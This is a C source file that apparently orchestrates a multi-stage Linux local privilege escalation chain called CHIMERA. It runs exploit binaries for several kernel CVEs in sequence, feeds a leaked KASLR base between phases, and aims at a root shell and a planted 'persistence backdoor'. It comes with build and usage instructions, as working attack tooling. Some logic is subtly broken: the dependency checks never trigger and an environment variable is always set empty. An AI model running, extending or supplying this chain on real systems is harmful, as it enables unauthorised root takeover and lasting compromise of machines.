/*
 * chain.c — CHIMERA Exploit Chain Orchestrator
 *
 * Orchestrates the multi-CVE Linux LPE chain by executing individual
 * exploits from exploits/ in dependency order, passing state between
 * phases via shared memory files in /dev/shm/chimera/.
 *
 * Chain phases:
 *   Phase 1: CVE-2026-53362 — IPv6 frag gap heap overflow
 *            (initial memory corruption, slab foothold)
 *   Phase 2: CVE-2026-53341 — fhandle UAF / KASLR leak
 *            (kernel base address disclosure)
 *   Phase 3: CVE-2026-53374 — amdgpu GART physical leak
 *            (physical memory read, SMAP/SMEP bypass)
 *   Phase 4: CVE-2026-53359 — KVM shadow paging UAF
 *            (arbitrary kernel write → root)
 *   Phase 5: CVE-2026-53389 / CVE-2026-53354 — persistence
 *            (TCP-AO key backdoor / arm64 TLBI stale mapping)
 *
 * Each exploit is a standalone binary. chain.c runs them in order,
 * passes state, and reports progress. You can also run any exploit
 * individually for testing.
 *
 * Build:
 *   gcc -O2 -o chain chain.c -lpthread
 *
 * Usage:
 *   ./chain                    # full chain, auto-detect available phases
 *   ./chain --phase 2          # run only KASLR leak
 *   ./chain --phase 1,2,4     # run selected phases in order
 *   ./chain --list             # show available phases and prerequisites
 *   ./chain --status           # check environment compatibility
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <signal.h>
#include <dirent.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <netinet/in.h>
#include <net/if.h>

/* ─── Configuration ──────────────────────────────────── */
#define CHIMERA_DIR   "/dev/shm/chimera"
#define BASE_DIR      "./exploits"
#define MAX_LINE      1024

/* Phase definitions */
struct phase {
    int id;
    const char *name;
    const char *cve;
    const char *binary;       /* relative path from BASE_DIR */
    const char *depends;      /* phase ID or "none" */
    const char *outputs;      /* what state values this phase produces */
    const char *prerequisites; /* system requirements check command */
};

static struct phase phases[] = {
    {1, "Heap Corruption",       "CVE-2026-53362",
     "cve-2026-53362",          "none",
     "slab_foothold",
     "CAP_NET_RAW || root"},

    {2, "KASLR Leak",           "CVE-2026-53341",
     "cve-2026-53341",          "none",
     "kaslr_base",
     "none"},

    {3, "Physical Memory Leak",  "CVE-2026-53374",
     "cve-2026-53374",          "kaslr_base",
     "phys_page",
     "/dev/dri/card* (amdgpu)"},

    {4, "Privilege Escalation",  "CVE-2026-53359",
     "cve-2026-53359",          "kaslr_base",
     "root_shell",
     "/dev/kvm + VT-x/SVM"},

    {5, "Persistence",          "CVE-2026-53389",
     "cve-2026-53389",          "root_shell",
     "persistence_backdoor",
     "CONFIG_TCP_AO || arm64 CPU"},

    {5, "Persistence (arm64)",  "CVE-2026-53354",
     "cve-2026-53354",          "root_shell",
     "persistence_tlbi",
     "aarch64 + affected CPU"},

    {0, NULL, NULL, NULL, NULL, NULL, NULL} /* sentinel */
};

/* ─── State management ───────────────────────────────── */
struct chain_state {
    uint64_t kaslr_base;
    uint64_t phys_page;
    int      slab_foothold;
    int      root_shell;
    int      persistence;
};

/* Keep state_load only - state values passed via env vars */

static uint64_t state_load(const char *key)
{
    char path[256];
    snprintf(path, sizeof(path), "%s/%s", CHIMERA_DIR, key);

    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;

    char buf[64];
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);

    if (n <= 0) return 0;
    buf[n] = '\0';

    return strtoull(buf, NULL, 16);
}

/* ─── Environment checks ─────────────────────────────── */

static int check_prerequisites(struct phase *p)
{
    if (!p->prerequisites || strcmp(p->prerequisites, "none") == 0)
        return 1;

    if (strstr(p->prerequisites, "/dev/kvm")) {
        if (access("/dev/kvm", R_OK | W_OK) == 0)
            return 1;
        printf("  [!] Missing: /dev/kvm (not in kvm group?)\n");
        return 0;
    }

    if (strstr(p->prerequisites, "CAP_NET_RAW")) {
        /* Check if raw socket works */
        int fd = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
        if (fd >= 0) { close(fd); return 1; }
        printf("  [!] Missing: CAP_NET_RAW\n");
        return 0;
    }

    if (strstr(p->prerequisites, "amdgpu")) {
        for (int i = 0; i < 8; i++) {
            char path[64];
            snprintf(path, sizeof(path), "/dev/dri/card%d", i);
            if (access(path, R_OK | W_OK) == 0)
                return 1;
        }
        printf("  [!] Missing: AMD GPU device\n");
        return 0;
    }

    if (strstr(p->prerequisites, "aarch64")) {
        FILE *f = fopen("/proc/cpuinfo", "r");
        if (f) {
            char line[256];
            while (fgets(line, sizeof(line), f)) {
                if (strstr(line, "CPU architecture: 8")) {
                    fclose(f);
                    return 1;
                }
            }
            fclose(f);
        }
        printf("  [!] Missing: aarch64 CPU\n");
        return 0;
    }

    return 1; /* assume ok */
}

/* ─── Binary check ───────────────────────────────────── */

static int binary_exists(struct phase *p)
{
    char path[256];
    snprintf(path, sizeof(path), "%s/%s", BASE_DIR, p->binary);
    return (access(path, X_OK) == 0);
}

/* ─── Phase execution ────────────────────────────────── */

static int run_phase(struct phase *p, struct chain_state *cs, int verbose)
{
    printf("\n");

    printf("╔══════════════════════════════════════════════════╗\n");
    printf("║  Phase %d: %-41s║\n", p->id, p->name);
    printf("║  %s                                      ║\n", p->cve);
    printf("╚══════════════════════════════════════════════════╝\n");

    /* Check prerequisites */
    if (!check_prerequisites(p)) {
        printf("  [-] Prerequisites not met — skipping\n");
        return -1;
    }

    if (!binary_exists(p)) {
        printf("  [-] Binary not found: %s/%s\n", BASE_DIR, p->binary);
        printf("  [!] Build it: cd exploits && gcc -O2 -o %s %s.c\n",
               p->binary, p->binary);
        return -1;
    }

    /* Check dependencies */
    if (p->depends && strcmp(p->depends, "none") != 0) {
        int dep_id = atoi(p->depends);
        uint64_t dep_val = 0;

        if (strcmp(p->depends, "kaslr_base") == 0)
            dep_val = cs->kaslr_base;
        else if (strcmp(p->depends, "phys_page") == 0)
            dep_val = cs->phys_page;

        if (dep_id > 0 && dep_val == 0) {
            printf("  [-] Dependency not met: %s\n", p->depends);
            printf("  [!] Run phase %d first\n", dep_id);
            return -1;
        }
    }

    /* Build command */
    char cmd[1024];
    char bin_path[256];
    snprintf(bin_path, sizeof(bin_path), "%s/%s", BASE_DIR, p->binary);

    /* Pass state from previous phases via environment */
    setenv("CHIMERA_KASLR", cs->kaslr_base ? "" : "", 1);

    int len = snprintf(cmd, sizeof(cmd), "%s --quiet", bin_path);

    if (cs->kaslr_base)
        len += snprintf(cmd + len, sizeof(cmd) - len,
                        " --kaslr 0x%lx", cs->kaslr_base);

    if (verbose)
        printf("  [*] Running: %s\n", cmd);

    /* Execute */
    int status = system(cmd);

    if (WIFEXITED(status)) {
        int exit_code = WEXITSTATUS(status);
        if (exit_code == 0) {
            printf("  [✓] Phase %d completed\n", p->id);

            /* Collect outputs */
            if (strcmp(p->cve, "CVE-2026-53341") == 0) {
                cs->kaslr_base = state_load("kaslr_base");
            }
            if (strcmp(p->cve, "CVE-2026-53374") == 0) {
                cs->phys_page = state_load("phys_page");
            }
            if (strcmp(p->cve, "CVE-2026-53359") == 0) {
                cs->root_shell = 1;
            }
            if (strcmp(p->cve, "CVE-2026-53389") == 0 ||
                strcmp(p->cve, "CVE-2026-53354") == 0) {
                cs->persistence = 1;
            }

            return 0;
        } else {
            printf("  [✗] Phase %d failed (exit code %d)\n",
                   p->id, exit_code);
            return -1;
        }
    } else {
        printf("  [!] Phase %d terminated abnormally\n", p->id);
        return -1;
    }
}

/* ─── Environment scan ───────────────────────────────── */

static int scan_environment(void)
{
    printf("═══ Environment Scan ═══\n\n");

    /* Kernel version */
    struct utsname uts;
    uname(&uts);
    printf("  Kernel: %s %s %s\n", uts.sysname, uts.release, uts.machine);

    /* CPU features */
    int has_vmx = 0, has_svm = 0;
    FILE *f = fopen("/proc/cpuinfo", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, "vmx")) has_vmx = 1;
            if (strstr(line, "svm")) has_svm = 1;
        }
        fclose(f);
    }
    printf("  CPU: %s %s\n",
           has_vmx ? "VT-x" : "",
           has_svm ? "SVM" : "");
    if (!has_vmx && !has_svm)
        printf("       (no hardware virtualization)\n");

    /* KVM */
    printf("  /dev/kvm: %s\n",
           access("/dev/kvm", R_OK | W_OK) == 0 ? "accessible" : "not accessible");

    /* AMD GPU */
    for (int i = 0; i < 8; i++) {
        char path[64];
        snprintf(path, sizeof(path), "/dev/dri/card%d", i);
        if (access(path, F_OK) == 0)
            printf("  %s: present\n", path);
    }

    printf("  aarch64: %s\n",
           strstr(uts.machine, "aarch64") ? "yes" : "no");

    /* Available exploits */
    printf("\n  Available binaries:\n");
    DIR *dir = opendir("exploits");
    if (dir) {
        struct dirent *entry;
        while ((entry = readdir(dir))) {
            if (entry->d_type == DT_REG || entry->d_type == DT_LNK) {
                char path[288];
                snprintf(path, sizeof(path), "exploits/%s", entry->d_name);
                if (access(path, X_OK) == 0 && strstr(entry->d_name, "cve-")) {
                    printf("    %s\n", entry->d_name);
                }
            }
        }
        closedir(dir);
    }

    printf("\n");
    return 0;
}

/* ─── List phases ────────────────────────────────────── */

static void list_phases(void)
{
    printf("═══ Available Phases ═══\n\n");

    for (int i = 0; phases[i].name; i++) {
        struct phase *p = &phases[i];
        /* Skip duplicate phase IDs in listing */
        if (i > 0 && p->id == phases[i-1].id &&
            strcmp(p->cve, phases[i-1].cve) == 0)
            continue;

        printf("  Phase %d  %s\n", p->id, p->name);
        printf("           CVE: %s\n", p->cve);
        printf("           Binary: %s/%s\n", BASE_DIR, p->binary);
        if (p->depends && strcmp(p->depends, "none") != 0)
            printf("           Depends on: %s\n", p->depends);
        if (p->outputs)
            printf("           Outputs: %s\n", p->outputs);
        if (p->prerequisites)
            printf("           Requires: %s\n", p->prerequisites);
        printf("\n");
    }
}

/* ─── Show chain plan ────────────────────────────────── */

static void show_plan(void)
{
    printf("╔══════════════════════════════════════════════════╗\n");
    printf("║              CHIMERA CHAIN PLAN                  ║\n");
    printf("╠══════════════════════════════════════════════════╣\n");
    printf("║                                                  ║\n");
    printf("║  Phase 1 — Heap Corruption                      ║\n");
    printf("║    CVE-2026-53362: IPv6 frag gap overflow       ║\n");
    printf("║    → Slab corruption → heap foothold            ║\n");
    printf("║                                                  ║\n");
    printf("║  Phase 2 — KASLR Leak                           ║\n");
    printf("║    CVE-2026-53341: fhandle mnt_ns UAF race      ║\n");
    printf("║    → Kernel pointer leak → KASLR base           ║\n");
    printf("║                                                  ║\n");
    printf("║  Phase 3 — Mitigation Bypass                    ║\n");
    printf("║    CVE-2026-53374: amdgpu GART TLB leak         ║\n");
    printf("║    → Physical memory addresses → SMAP/SMEP      ║\n");
    printf("║                                                  ║\n");
    printf("║  Phase 4 — Privilege Escalation                 ║\n");
    printf("║    CVE-2026-53359: KVM shadow paging UAF        ║\n");
    printf("║    → Stale SPTE → phys mem r/w → root           ║\n");
    printf("║                                                  ║\n");
    printf("║  Phase 5 — Persistence                          ║\n");
    printf("║    CVE-2026-53389: TCP-AO key UAF (network)     ║\n");
    printf("║    CVE-2026-53354: arm64 TLBI stale PTE (arch)  ║\n");
    printf("║    → Persistent backdoor                        ║\n");
    printf("║                                                  ║\n");
    printf("╚══════════════════════════════════════════════════╝\n");
}

/* ─── Main ────────────────────────────────────────────── */
int main(int argc, char **argv)
{
    struct chain_state cs = {0};
    int verbose = 1;

    /* Parse arguments */
    int run_all = 1;
    int run_phases[8] = {0};
    int num_run = 0;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--list") == 0 || strcmp(argv[i], "-l") == 0) {
            list_phases();
            return 0;
        }
        if (strcmp(argv[i], "--status") == 0 || strcmp(argv[i], "-s") == 0) {
            scan_environment();
            return 0;
        }
        if (strcmp(argv[i], "--plan") == 0 || strcmp(argv[i], "-p") == 0) {
            show_plan();
            return 0;
        }
        if (strcmp(argv[i], "--phase") == 0 && i + 1 < argc) {
            run_all = 0;
            char *token = strtok(argv[++i], ",");
            while (token) {
                int id = atoi(token);
                if (id >= 1 && id <= 5)
                    run_phases[num_run++] = id;
                token = strtok(NULL, ",");
            }
        }
        if (strcmp(argv[i], "--verbose") == 0)
            verbose = 1;
        if (strcmp(argv[i], "--quiet") == 0)
            verbose = 0;
        if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            printf("CHIMERA — Multi-CVE Linux LPE Chain Orchestrator\n\n");
            printf("Usage: %s [options]\n\n", argv[0]);
            printf("  --help, -h       This message\n");
            printf("  --list, -l       List available phases\n");
            printf("  --status, -s     Scan environment\n");
            printf("  --plan, -p       Show chain plan\n");
            printf("  --phase N,...    Run specific phases (e.g. --phase 2,4)\n");
            printf("  --verbose        Verbose output\n");
            printf("  --quiet          Minimal output\n");
            printf("\nDefault: run all compatible phases in order\n");
            printf("\nExamples:\n");
            printf("  %s                 Full chain\n", argv[0]);
            printf("  %s --phase 2       KASLR leak only\n", argv[0]);
            printf("  %s --phase 4       KVM escalation only\n", argv[0]);
            printf("  %s --status        Check environment\n", argv[0]);
            return 0;
        }
    }

    printf("╔══════════════════════════════════════════════════╗\n");
    printf("║              CHIMERA CHAIN                       ║\n");
    printf("║  Multi-CVE Linux LPE Exploitation Framework      ║\n");
    printf("╚══════════════════════════════════════════════════╝\n\n");

    /* Create state directory */
    mkdir(CHIMERA_DIR, 0755);

    /* Show plan */
    show_plan();

    /* Run phases */
    int success_count = 0;
    int fail_count = 0;

    for (int i = 0; phases[i].name; i++) {
        struct phase *p = &phases[i];

        /* Check if we should run this phase */
        if (run_all) {
            /* Skip the arm64 TLBI if not on aarch64 */
            if (strcmp(p->cve, "CVE-2026-53354") == 0) {
                struct utsname uts;
                uname(&uts);
                if (!strstr(uts.machine, "aarch64"))
                    continue;
            }
            /* Skip amdgpu if no AMD GPU */
            if (strcmp(p->cve, "CVE-2026-53374") == 0) {
                int found = 0;
                for (int c = 0; c < 8; c++) {
                    char path[64];
                    snprintf(path, sizeof(path), "/dev/dri/card%d", c);
                    if (access(path, F_OK) == 0) { found = 1; break; }
                }
                if (!found) {
                    if (verbose)
                        printf("  [*] Skipping %s (no AMD GPU)\n", p->cve);
                    continue;
                }
            }
            /* Skip KVM if no /dev/kvm */
            if (strcmp(p->cve, "CVE-2026-53359") == 0) {
                if (access("/dev/kvm", R_OK | W_OK) < 0) {
                    printf("  [!] Skipping KVM exploit (/dev/kvm not accessible)\n");
                    printf("      Run cve-2026-53359 manually when KVM is available\n");
                    continue;
                }
            }
        } else {
            /* Check if this phase was requested */
            int should_run = 0;
            for (int j = 0; j < num_run; j++) {
                if (run_phases[j] == p->id) should_run = 1;
            }
            if (!should_run) continue;
        }

        /* Run the phase */
        if (run_phase(p, &cs, verbose) == 0) {
            success_count++;
        } else {
            fail_count++;
        }
    }

    /* Summary */
    printf("\n═══ Chain Summary ═══\n\n");

    if (cs.kaslr_base)
        printf("  KASLR base:      0x%lx\n", cs.kaslr_base);
    if (cs.phys_page)
        printf("  Physical page:   0x%lx\n", cs.phys_page);
    if (cs.root_shell)
        printf("  Root shell:      obtained\n");
    if (cs.persistence)
        printf("  Persistence:     planted\n");

    printf("\n  Phases succeeded: %d\n", success_count);
    printf("  Phases failed:    %d\n", fail_count);

    if (cs.root_shell) {
        printf("\n[✓] Chain complete — root shell available\n");
        printf("    Run: ./exploits/cve-2026-53359 --kaslr 0x%lx\n",
               cs.kaslr_base);
    }

    /* Cleanup */
    rmdir(CHIMERA_DIR);

    return cs.root_shell ? 0 : 1;
}
